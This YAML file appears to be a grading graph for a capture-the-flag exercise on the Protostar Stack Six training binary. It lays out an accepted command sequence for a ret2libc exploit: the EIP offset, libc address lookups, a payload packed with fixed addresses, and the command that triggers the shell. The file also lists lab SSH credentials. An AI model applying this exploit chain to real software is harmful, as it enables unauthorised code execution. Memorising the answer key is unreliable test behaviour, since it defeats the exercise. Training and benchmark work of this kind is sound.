version: '0.5'
graph:
  type: reference
challenge:
  id: protostar_stack6
  name: Protostar Stack Six
  description: Bypass the stack-return-address restriction and gain code execution, for example with ret2libc.
attacker_context:
  user: user
  access:
    method: ssh
    credentials:
      username: user
      password: user
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node4
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- strings
- checksec
- file
- ls
- ls -la
- env
- printenv
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Saved EIP offset identified
- id: node1
  type: state
  label: libc system() address recovered
- id: node2
  type: state
  label: libc exit() and /bin/sh address recovered
- id: node3
  type: state
  label: ret2libc payload built
- id: node4
  type: state
  label: Shell obtained via ret2libc
edges:
- id: edge0
  from: start
  to: node0
  action: find_saved_eip_offset
  accepted_commands:
  - gdb -q /opt/protostar/bin/stack6
  - python -c 'print "A"*80' | /opt/protostar/bin/stack6
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
- id: edge1
  from: node0
  to: node1
  action: recover_system_address
  accepted_commands:
  - gdb -q /opt/protostar/bin/stack6
  - objdump -T /lib/libc.so.6 | grep ' system$'
  transition_match:
    exit_code: 0
    stdout_regex: .*system.*
    stderr_regex: .*
- id: edge2
  from: node1
  to: node2
  action: recover_exit_and_binsh_addresses
  accepted_commands:
  - objdump -T /lib/libc.so.6 | grep ' exit$'
  - strings -a -t x /lib/libc.so.6 | grep '/bin/sh'
  transition_match:
    exit_code: 0
    stdout_regex: .*(exit|/bin/sh).*
    stderr_regex: .*
- id: edge3
  from: node2
  to: node3
  action: build_ret2libc_payload
  accepted_commands:
  - python -c 'import struct; print "A"*80 + struct.pack("<I", 0xb7ecffb0) + struct.pack("<I", 0xb7ec60c0) + struct.pack("<I", 0xb7fb63bf)' > /tmp/stack6.in
  transition_match:
    exit_code: 0
    stdout_regex: ^$
    stderr_regex: ^$
- id: edge4
  from: node3
  to: node4
  action: trigger_ret2libc
  accepted_commands:
  - /opt/protostar/bin/stack6 < /tmp/stack6.in
  transition_match:
    exit_code: 0
    stdout_regex: .*(sh-|[$#]).*
    stderr_regex: .*
